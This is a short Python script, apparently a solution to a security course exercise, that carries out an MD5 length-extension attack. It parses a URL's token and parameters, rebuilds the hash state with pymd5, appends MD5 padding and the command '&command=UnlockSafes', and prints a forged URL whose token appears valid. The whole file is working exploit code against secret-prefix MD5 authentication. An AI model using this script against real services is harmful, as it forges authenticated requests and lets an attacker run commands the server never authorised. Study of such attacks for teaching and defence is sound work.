import urllib
from urllib.parse import quote
import sys
from pymd5 import md5, padding

passLength = 8
newCom = "&command=UnlockSafes"
address = sys.argv[1]
new_address = ""

split_address = address.split("&", 1)
#Splits directly after the token
get_token = split_address[0].split("=")
#Splits directly before the token
new_address += get_token[0] + "="
#Gets the token
token = get_token[1]
#Gets the message behind the token
message = split_address[1]
#Calculates the length of the message to mimic
length_of_m = passLength + len(message)
bits = (length_of_m + len(padding(length_of_m * 8))) * 8
h = md5(state=bytes.fromhex(token), count=bits)                                                                         #Hashes the command to be appended to the old commands
h.update(newCom)
new_address += h.hexdigest() + "&" + message + quote(padding(length_of_m * 8)) + newCom                                 #Creates the new URL with the binary padding
print(new_address)

